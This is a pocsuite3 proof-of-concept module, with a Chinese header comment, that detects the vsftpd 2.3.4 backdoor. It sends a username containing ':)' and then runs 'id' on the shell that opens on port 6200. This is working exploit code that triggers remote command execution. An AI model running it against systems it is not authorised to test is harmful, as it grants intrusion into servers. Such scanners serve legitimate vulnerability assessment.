# -*- coding: utf-8 -*-
# author: seven
'''
vsftp的2.3.4版本曾被植入后门，后被修复。该后门版本中，ftp连接时，若user中含有笑脸:)，输入任意密码后，vsftp将打开6200端口为一个后门端口，直接进行命令执行
'''

from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
from pocsuite3.lib.core.threads import run_threads
import socket

def check_smile(ip,port):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(5)
    check_s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((ip,int(port)))
        banner = s.recv(1024)
        if b'vsFTPd 2.3.4' not in banner:
            return False
        s.send(b'USER root:)\n')
        logger.info(s.recv(1024))
        s.send(b'PASS 123123\n')
        logger.info(s.recv(1024))
    except Exception as e:
        logger.info('{}:{}\t{}'.format(ip,port,str(e)))
    try:
        check_s.connect((ip,6200))
        check_s.send(b'id\n')
        recv = check_s.recv(1024)
        logger.info(recv)
        if b'uid' in recv:
            return True
    except Exception as e:
        logger.info('{}:{}\t{}'.format(ip,port,str(e)))
    finally:
        s.close()
        check_s.close()
    return False

class FTP_BACKDOOR_POC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Jul 19, 2020'
    createDate = 'Jul 19, 2020'
    name = 'ftp backdoor'
    appName = 'ftp'
    appVersion = 'v1.0.0'
    vulType = 'backdoor'
    protocol = POC_CATEGORY.PROTOCOL.FTP

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 21
        result = {}
        if check_smile(host,port):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['extra'] = ''
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

register_poc(FTP_BACKDOOR_POC)